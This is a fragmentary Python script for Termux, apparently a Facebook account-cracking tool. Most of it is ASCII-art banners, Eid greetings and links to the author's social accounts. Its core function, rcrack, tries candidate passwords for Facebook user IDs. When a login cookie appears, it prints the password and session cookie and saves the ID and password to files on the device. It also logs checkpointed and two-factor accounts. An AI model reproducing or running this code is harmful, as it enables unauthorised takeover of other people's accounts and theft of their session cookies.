...
os.system('xdg-open https://github.com/DevilXM4H1N -007')
...
os.system('espeak -a 300 " Wishing everyone an early Eid from DEVIL X M4H1N  TERMUX WORLD"')
...
x1 = """ 
 ...
 __          ___     _     _               ______                                      
 \ \        / (_)   | |   (_)             |  ____|                                     
  \ \  /\  / / _ ___| |__  _ _ __   __ _  | |____   _____ _ __ _   _  ___  _ __   ___  
   \ \/  \/ / | / __| '_ \| | '_ \ / _` | |  __\ \ / / _ \ '__| | | |/ _ \| '_ \ / _ \ 
    \  /\  /  | \__ \ | | | | | | | (_| | | |___\ V /  __/ |  | |_| | (_) | | | |  __/ 
     \/  \/   |_|___/_| |_|_|_| |_|\__, | |______\_/ \___|_|   \__, |\___/|_| |_|\___| 
                                    __/ |                       __/ |                  
                                   |___/                       |___/                   
...
x3 = """ 
 ...
 |  __| / _` | '__| | | | | |  __| | |/ _` |
 | |___| (_| | |  | | |_| | | |____| | (_| |
 |______\__,_|_|  |_|\__, | |______|_|\__,_|
                      __/ |                 
                     |___/                  
...
______  ______  __   __      _     _      _______ _     _ __   _ 
 |     \ |     \   \_/         \___/       |  |  | |_____| | \  |    
 |_____/ |_____/    |         _/   \_      |  |  | |     | |  \_|  
...
m = """                                
 ...
 .S_SSSs     .S_sSSs     .S_sSSs     .S_SSSs     .S_sSSs      sSSs   .S_sSSs              .S   .S_SSSs     .S_sSSs     .S_SSSs     .S  
.SS~SSSSS   .SS~YS%%b   .SS~YS%%b   .SS~SSSSS   .SS~YS%%b    d%%SP  .SS~YS%%b            .SS  .SS~SSSSS   .SS~YS%%b   .SS~SSSSS   .SS  
S%S   SSSS  S%S   `S%b  S%S   `S%b  S%S   SSSS  S%S   `S%b  d%S'    S%S   `S%b           S%S  S%S   SSSS  S%S   `S%b  S%S   SSSS  S%S  
S%S    S%S  S%S    S%S  S%S    S%S  S%S    S%S  S%S    S%S  S%S     S%S    S%S           S%S  S%S    S%S  S%S    S%S  S%S    S%S  S%S  
S%S SSSS%S  S%S    d*S  S%S    S&S  S%S SSSS%S  S%S    S&S  S&S     S%S    d*S           S&S  S%S SSSS%S  S%S    S&S  S%S SSSS%S  S&S  
S&S  SSS%S  S&S   .S*S  S&S    S&S  S&S  SSS%S  S&S    S&S  S&S_Ss  S&S   .S*S           S&S  S&S  SSS%S  S&S    S&S  S&S  SSS%S  S&S  
S&S    S&S  S&S_sdSSS   S&S    S&S  S&S    S&S  S&S    S&S  S&S~SP  S&S_sdSSS            S&S  S&S    S&S  S&S    S&S  S&S    S&S  S&S  
S&S    S&S  S&S~YSSY    S&S    S&S  S&S    S&S  S&S    S&S  S&S     S&S~YSY%b            S&S  S&S    S&S  S&S    S&S  S&S    S&S  S&S  
S*S    S&S  S*S         S*S    S*S  S*S    S&S  S*S    d*S  S*b     S*S   `S%b           d*S  S*S    S&S  S*S    S*S  S*S    S&S  S*S  
S*S    S*S  S*S         S*S    S*S  S*S    S*S  S*S   .S*S  S*S.    S*S    S%S          .S*S  S*S    S*S  S*S    S*S  S*S    S*S  S*S  
S*S    S*S  S*S         S*S    S*S  S*S    S*S  S*S_sdSSS    SSSbs  S*S    S&S        sdSSS   S*S    S*S  S*S    S*S  S*S    S*S  S*S  
SSS    S*S  S*S         S*S    SSS  SSS    S*S  SSS~YSSY      YSSP  S*S    SSS        YSSY    SSS    S*S  S*S    SSS  SSS    S*S  S*S  
...
b = """                     
 ...
 .S_sSSs     .S_sSSs     .S    sSSs_sSSs              .S    sSSs_sSSs     .S_sSSs      sSSs   .S_sSSs            sSSs   .S_SSSs    sdSS_SSSSSSbs   .S    S.     sSSs  
.SS~YS%%b   .SS~YS%%b   .SS   d%%SP~YS%%b            .SS   d%%SP~YS%%b   .SS~YS%%b    d%%SP  .SS~YS%%b          d%%SP  .SS~SSSSS   YSSS~S%SSSSSP  .SS    SS.   d%%SP  
S%S   `S%b  S%S   `S%b  S%S  d%S'     `S%b           S%S  d%S'     `S%b  S%S   `S%b  d%S'    S%S   `S%b        d%S'    S%S   SSSS       S%S       S%S    S%S  d%S'    
S%S    S%S  S%S    S%S  S%S  S%S       S%S           S%S  S%S       S%S  S%S    S%S  S%S     S%S    S%S        S%|     S%S    S%S       S%S       S%S    S%S  S%S     
S%S    d*S  S%S    d*S  S&S  S&S       S&S           S&S  S&S       S&S  S%S    S&S  S&S     S%S    d*S        S&S     S%S SSSS%S       S&S       S%S SSSS%S  S&S     
S&S   .S*S  S&S   .S*S  S&S  S&S       S&S           S&S  S&S       S&S  S&S    S&S  S&S_Ss  S&S   .S*S        Y&Ss    S&S  SSS%S       S&S       S&S  SSS&S  S&S_Ss  
S&S_sdSSS   S&S_sdSSS   S&S  S&S       S&S           S&S  S&S       S&S  S&S    S&S  S&S~SP  S&S_sdSSS         `S&&S   S&S    S&S       S&S       S&S    S&S  S&S~SP  
S&S~YSSY    S&S~YSY%b   S&S  S&S       S&S           S&S  S&S       S&S  S&S    S&S  S&S     S&S~YSY%b           `S*S  S&S    S&S       S&S       S&S    S&S  S&S     
S*S         S*S   `S%b  S*S  S*b       d*S           d*S  S*b       d*S  S*S    S*S  S*b     S*S   `S%b           l*S  S*S    S&S       S*S       S*S    S*S  S*b     
S*S         S*S    S%S  S*S  S*S.     .S*S          .S*S  S*S.     .S*S  S*S    S*S  S*S.    S*S    S%S          .S*P  S*S    S*S       S*S       S*S    S*S  S*S.    
S*S         S*S    S&S  S*S   SSSbs_sdSSS         sdSSS    SSSbs_sdSSS   S*S    S*S   SSSbs  S*S    S&S        sSS*S   S*S    S*S       S*S       S*S    S*S   SSSbs  
S*S         S*S    SSS  S*S    YSSP~YSSY          YSSY      YSSP~YSSY    S*S    SSS    YSSP  S*S    SSS        YSS'    SSS    S*S       S*S       SSS    S*S    YSSP  
...
a = """                                  
 ...
 .S    S.    .S_SSSs    sdSS_SSSSSSbs   .S_SSSs     .S_sSSs           .S_SSSs     .S_sSSs     .S_sSSs     .S_SSSs     .S_sSSs      sSSs   .S_sSSs           .S    S.    .S    S.    .S       S.     sSSs   .S    S.    .S   .S_sSSs            sSSs    sSSs_sSSs     .S_SsS_S.     sSSs_sSSs     .S S.   
.SS    SS.  .SS~SSSSS   YSSS~S%SSSSSP  .SS~SSSSS   .SS~YS%%b         .SS~SSSSS   .SS~YS%%b   .SS~YS%%b   .SS~SSSSS   .SS~YS%%b    d%%SP  .SS~YS%%b         .SS    SS.  .SS    SS.  .SS       SS.   d%%SP  .SS    SS.  .SS  .SS~YS%%b          d%%SP   d%%SP~YS%%b   .SS~S*S~SS.   d%%SP~YS%%b   .SS SS.  
S%S    S&S  S%S   SSSS       S%S       S%S   SSSS  S%S   `S%b        S%S   SSSS  S%S   `S%b  S%S   `S%b  S%S   SSSS  S%S   `S%b  d%S'    S%S   `S%b        S%S    S&S  S%S    S%S  S%S       S%S  d%S'    S%S    S%S  S%S  S%S   `S%b        d%S'    d%S'     `S%b  S%S `Y' S%S  d%S'     `S%b  S%S S%S  
S%S    d*S  S%S    S%S       S%S       S%S    S%S  S%S    S%S        S%S    S%S  S%S    S%S  S%S    S%S  S%S    S%S  S%S    S%S  S%S     S%S    S%S        S%S    d*S  S%S    S%S  S%S       S%S  S%|     S%S    S%S  S%S  S%S    S%S        S%|     S%S       S%S  S%S     S%S  S%S       S%S  S%S S%S  
S&S   .S*S  S%S SSSS%S       S&S       S%S SSSS%S  S%S    S&S        S%S SSSS%S  S%S    d*S  S%S    S&S  S%S SSSS%S  S%S    S&S  S&S     S%S    d*S        S&S   .S*S  S%S SSSS%S  S&S       S&S  S&S     S%S SSSS%S  S&S  S%S    d*S        S&S     S&S       S&S  S%S     S%S  S&S       S&S  S%S S%S  
S&S_sdSSS   S&S  SSS%S       S&S       S&S  SSS%S  S&S    S&S        S&S  SSS%S  S&S   .S*S  S&S    S&S  S&S  SSS%S  S&S    S&S  S&S_Ss  S&S   .S*S        S&S_sdSSS   S&S  SSS&S  S&S       S&S  Y&Ss    S&S  SSS&S  S&S  S&S   .S*S        Y&Ss    S&S       S&S  S&S     S&S  S&S       S&S   SS SS   
S&S~YSSY%b  S&S    S&S       S&S       S&S    S&S  S&S    S&S        S&S    S&S  S&S_sdSSS   S&S    S&S  S&S    S&S  S&S    S&S  S&S~SP  S&S_sdSSS         S&S~YSSY%b  S&S    S&S  S&S       S&S  `S&&S   S&S    S&S  S&S  S&S_sdSSS         `S&&S   S&S       S&S  S&S     S&S  S&S       S&S    S S    
S&S    `S%  S&S    S&S       S&S       S&S    S&S  S&S    S&S        S&S    S&S  S&S~YSSY    S&S    S&S  S&S    S&S  S&S    S&S  S&S     S&S~YSY%b         S&S    `S%  S&S    S&S  S&S       S&S    `S*S  S&S    S&S  S&S  S&S~YSY%b           `S*S  S&S       S&S  S&S     S&S  S&S       S&S    SSS    
S*S     S%  S*S    S&S       S*S       S*S    S&S  S*S    S*S        S*S    S&S  S*S         S*S    S*S  S*S    S&S  S*S    d*S  S*b     S*S   `S%b        S*S     S%  S*S    S*S  S*b       d*S     l*S  S*S    S*S  S*S  S*S   `S%b           l*S  S*b       d*S  S*S     S*S  S*b       d*S    S*S    
S*S     S&  S*S    S*S       S*S       S*S    S*S  S*S    S*S        S*S    S*S  S*S         S*S    S*S  S*S    S*S  S*S   .S*S  S*S.    S*S    S%S        S*S     S&  S*S    S*S  S*S.     .S*S    .S*P  S*S    S*S  S*S  S*S    S%S          .S*P  S*S.     .S*S  S*S     S*S  S*S.     .S*S    S*S    
S*S     S&  S*S    S*S       S*S       S*S    S*S  S*S    S*S        S*S    S*S  S*S         S*S    S*S  S*S    S*S  S*S_sdSSS    SSSbs  S*S    S&S        S*S     S&  S*S    S*S   SSSbs_sdSSS   sSS*S   S*S    S*S  S*S  S*S    S&S        sSS*S    SSSbs_sdSSS   S*S     S*S   SSSbs_sdSSS     S*S    
S*S     SS  SSS    S*S       S*S       SSS    S*S  S*S    SSS        SSS    S*S  S*S         S*S    SSS  SSS    S*S  SSS~YSSY      YSSP  S*S    SSS        S*S     SS  SSS    S*S    YSSP~YSSY    YSS'    SSS    S*S  S*S  S*S    SSS        YSS'      YSSP~YSSY    SSS     S*S    YSSP~YSSY      S*S    
...
r = """ 
 ...
 .S_SSSs     .S_SSSs     .S_SSSs     .S_sSSs      sSSs_sSSs              .S   .S_SSSs     .S_sSSs     .S_SSSs     .S        
.SS~SSSSS   .SS~SSSSS   .SS~SSSSS   .SS~YS%%b    d%%SP~YS%%b            .SS  .SS~SSSSS   .SS~YS%%b   .SS~SSSSS   .SS        
S%S   SSSS  S%S   SSSS  S%S   SSSS  S%S   `S%b  d%S'     `S%b           S%S  S%S   SSSS  S%S   `S%b  S%S   SSSS  S%S        
S%S    S%S  S%S    S%S  S%S    S%S  S%S    S%S  S%S       S%S           S%S  S%S    S%S  S%S    S%S  S%S    S%S  S%S        
S%S SSSS%S  S%S SSSS%P  S%S SSSS%S  S%S    d*S  S&S       S&S           S&S  S%S SSSS%S  S%S    S&S  S%S SSSS%S  S&S        
S&S  SSS%S  S&S  SSSY   S&S  SSS%S  S&S   .S*S  S&S       S&S           S&S  S&S  SSS%S  S&S    S&S  S&S  SSS%S  S&S        
S&S    S&S  S&S    S&S  S&S    S&S  S&S_sdSSS   S&S       S&S           S&S  S&S    S&S  S&S    S&S  S&S    S&S  S&S        
S&S    S&S  S&S    S&S  S&S    S&S  S&S~YSY%b   S&S       S&S           S&S  S&S    S&S  S&S    S&S  S&S    S&S  S&S        
S*S    S&S  S*S    S&S  S*S    S&S  S*S   `S%b  S*b       d*S           d*S  S*S    S&S  S*S    S*S  S*S    S&S  S*S        
S*S    S*S  S*S    S*S  S*S    S*S  S*S    S%S  S*S.     .S*S          .S*S  S*S    S*S  S*S    S*S  S*S    S*S  S*S        
S*S    S*S  S*S SSSSP   S*S    S*S  S*S    S&S   SSSbs_sdSSS         sdSSS   S*S    S*S  S*S    S*S  S*S    S*S  S*S        
SSS    S*S  S*S  SSY    SSS    S*S  S*S    SSS    YSSP~YSSY          YSSY    SSS    S*S  S*S    SSS  SSS    S*S  S*S        
       SP   SP                 SP   SP                                              SP   SP                 SP   SP         
       Y    Y                  Y    Y                                               Y    Y                  Y    Y          
...
┌────♣─────┐
               ...
               ❤
      Wishing everyone an early Eid from DEVIL X M4H1N  TERMUX WORLD
               🧡
        Eid mubarak 
               💙 
       ༊᭄
...
\033[31;1m______  ______  __   __      _     _      _______ _     _ __   _ 
\033[32;1m |     \ |     \   \_/         \___/       |  |  | |_____| | \  |    
\033[33;1m |_____/ |_____/    |         _/   \_      |  |  | |     | |  \_|  
 \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n
...
for i in range(1):
  os.system('espeak -a 300 " ঈদ মোবারক ৩৬৫ দিন"')
  os.system("clear")
  time.sleep(0.08)
  print(bgreen + stlp)
  time.sleep(0.08)
...
url_mb = "https://m.facebook.com/d4dy.m4h1n"
...
class jihad:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.009)
os.system('xdg open https://facebook.com/groups/d4dy.m4h1n/')
...
\x1b[38;5;46m______________________________________________________
 \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m DEVELOPER : D4DY M4H1N E 
 \033[1;31m[\033[1;32m[R]\033[1;31m]\033[1;32m DEVELOPER : D4DY-M4H1N
 \033[1;31m[\033[1;32m[I]\033[1;31m]\033[1;32m FACEBOOK  : D4DY M4H1N E 
 \033[1;31m[\033[1;32m[D]\033[1;31m]\033[1;32m GITHUB    : D4DY-M4H1N E
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\33[1;97m[\33[1;92mM4H1N E-👻\33[1;97m]\33[1;94m [%s/%s] \33[1;92mOK:-%s\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;34m[\033[\033[0;101mM4H1N E\033[0m[\033[1;32mOK\033[1;34m]\033[1;32m'+uid+'\033[1;32m • \033[1;32m'+ps+'')
                os.system("play-audio m4.mp3")
                print('\r\033[0;101mCOOKIE \033[0m=''\033[1;32m'+coki+'\033[0m''\033[0m')
               # cek_apk(session,coki)
                open('/sdcard/M4H1N E-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid);cek_apk(coki)
                break
          #  elif 'checkpoint' in log_cookies:
              #  coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
          #      cid = coki[24:39]
             #   print('\r\r\33[1;34m M4H1N E-CP ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/M4H1N E-cp👻.txt', 'a').write( uid+' | '+ps+' \n')
               # cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mM4H1N E-2F '+uid+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
